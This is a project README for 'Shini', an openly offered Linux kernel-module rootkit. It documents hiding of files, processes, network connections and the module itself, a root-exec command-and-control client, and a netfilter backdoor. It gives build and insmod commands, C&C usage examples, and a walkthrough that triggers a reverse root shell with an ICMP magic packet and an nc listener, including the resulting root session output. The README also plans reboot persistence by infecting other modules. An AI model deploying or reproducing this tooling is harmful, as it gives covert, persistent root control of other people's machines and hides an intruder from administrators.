# Intro

Shini is a modular lkm based rootkit(ring 0) for linux. Its purpose is to be simple, modular, 
generic (without relying on an architecture) and to segment its logical behavior from its hook methods.

# Features
  - exec any program with root privileges.
  - hide module (only itself).
  - hide files.
  - hide procresses.
  - hide tcp/udp (4 or 6, source or destination) connections.
  - netfilter backdoor.
 
# Dependencies
- gcc
- make
- linux headers
- insmod

# Tools

- shini/misc/cb, connect back. (the backdoor)
- shini/misc/cc, command and control (the client that will communicate with the rootkit).
- shini/scripts/bdt, backdoor trigger (a python script that will send icmp magic packets to the target).

# Build/Install

First you need to compile and load the lkm.

```console
# git clone https://github.com/Jin-Roh/shini
# cd shini/build
# make
# insmod shini.ko
```

Build and install the tools listed above.

```console
# cd shini/misc/
# ./install.sh
```

This shell script will be responsible for compiling, creating a folder in /etc/opt/ with a predetermined prefix, 
modifying the name of the programs and placing them in the folder created previously.

# Uninstall

```Just remove the module, if module_hide() are not commented in the main.c,``` 
```this will not work, it's necessary to reboot your vm.```

```console
# rmmod shini
```

# Standard Configuration

- prefix : .\_shini\_
- path   : /etc/opt/.\_shini\_/
- helper : /etc/opt/.\_shini\_/._shini_helper
- cb     : /etc/opt/.\_shini\_/._shini_cb
- cc     : /etc/opt/.\_shini\_/._shini_cc

Read shini/misc/install.sh and shini/src/include/config.h files for more details.

# Usage
## Command and Control
```console
$ cd /shini/misc/cc/build
$ make
$ ./cc
```
or after run the install script.

```console
cd /etc/opt/._shini_/
./._shini_cc
```

The way to use it with examples will appear on the console.

```console
usage: 

./cc -e <exec>
./cc -h <value> -l <list>
./cc -s <value> -l <list>

<list>: 
	proc , hidden proc list
	file , hidden file list
	t4_s , hidden tcp4 source port list
	t4_d , hidden tcp4 dest port list
	t6_s , hidden tcp6 source port list
	t6_d , hidden tcp6 dest port list
	u4_s , ..
	u4_d , ..
	u6_s , ..
	u6_d , ..

example:

./cc -e /bin/sh        	 - exec /bin/sh as root
./cc -h 1878  -l proc  	 - hide pid 1878
./cc -s 1878  -l proc  	 - show pid 1878
./cc -h 14000 -l file  	 - hide ino 14000
./cc -h 22    -l t4_s  	 - hide tcp4 src  port 22
./cc -h 1337  -l u6_d  	 - hide udp6 dest port 1337

```

## Backdoor

On your machine, first listen to the connection on a port using nc, e.g.:
```console
$ nc -vvlp 4430
```

Still on your machine, run the ```bdt.py```(needs root) script with the correct parameters, e.g.: 

```console
# cd shini/scripts/bdt
# python2.7 bdt.py -t <target> -h <host> -p <port>
# python2.7 bdt.py -t 192.168.1.103 -h 192.168.1.100 -p 4430
[+] Data : backdoor!_192.168.1.100_4430_
[+] Packet sent!
```

- target, where the rootkit is installed.
- host, machine that receives the reverse connection.
- port, the port.
 
If all goes well, you will get a root shell on nc.

```console
$ nc -vvlp 4430
listening on [any] 4430 ...
192.168.1.103: inverse host lookup failed: 
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.103] 49548
id
uid=0(root) gid=0(root) groups=0(root)
```

# Debug Messages

If syslog are installed:

```console
# tail -f /var/log/messages
```

Or:

```console
# dmesg | grep shini
```

# Tested on
 
- Linux 3.16.0-4-686-pae #1 SMP Debian 3.16.43-2+deb8u5 (2017-09-19) i686 GNU/Linux
- Linux 4.17.12-arch1-1-ARCH #1 SMP PREEMPT Fri Aug 3 07:16:41 UTC 2018 x86_64 GNU/Linux

# TODO
 
- persistence related to reboots (maybe the module infection technique, see references[4][7]).
- code documentation.
- better installation script.
- more tests, (mips, arm, powerpc, etc...).
- more tests, (kernel linux sources).

# References

1. https://elixir.bootlin.com/linux/v4.17.13/source
2. https://github.com/mncoppola/suterusu
3. http://phrack.org/issues/68/6.html#article  : Android platform based linux kernel rootkit, by dong-hoon you
4. http://phrack.org/issues/68/11.html#article : Infecting loadable kernel modules, by styx^
5. http://www.ouah.org/LKM_HACKING.html
6. http://phrack.org/issues/50/5.html#article  : Abuse of the Linux Kernel for Fun and Profit, by halflife
7. http://phrack.org/issues/61/13.html#article : Hacking the Linux Kernel Network Stack, by bioforge 
8. http://phrack.org/issues/61/10.html#article : Infecting loadable kernel modules, by truff

License
----
MIT
